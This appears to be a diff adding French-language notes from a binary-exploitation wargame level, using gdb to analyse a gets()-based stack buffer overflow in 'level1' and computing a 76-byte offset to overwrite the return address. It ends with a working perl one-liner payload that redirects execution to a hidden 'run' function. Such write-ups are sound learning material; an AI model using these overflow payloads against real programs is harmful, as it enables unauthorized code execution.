@@ -1,0 +1,29 @@
+gdb level1
+info functions
+ => run 
+
+disas run => adresse : 0x08048444
+
+disas main :
+
+Apres push d'ebp on aligne avec la memoire (+8 octets)
+Ensuite on reserve 0x50 soit 80 octets
+L'adresse d'esp est 88 octets en dessous d'ebp
+On charge eax a 16 bits au dessus d'esp
+Le gets charge la valeur recuperee sur l'entree standard dans eax
+Il faut donc charger 76 octets pour reecrire ebp et on y ajoute 4 octets pour ecrire une adresse sur eip
+
+
+b *0x08048495 (au niveau du leave, apres la declaration du buffer)
+
+i r (info registers)
+eax => 0xbffff6b0
+esp => 0xbffff6a0
+ebp => 0xbffff6f8
+eip => 0x8048495
+
+   ebp    -   esp
+0xbffff6f8-0xbffff6a0 = 0x58 (88 octets)
+
+
+(perl -e 'print "A"x76 . "\x44\x84\x04\x08"' ; cat) | ./level1
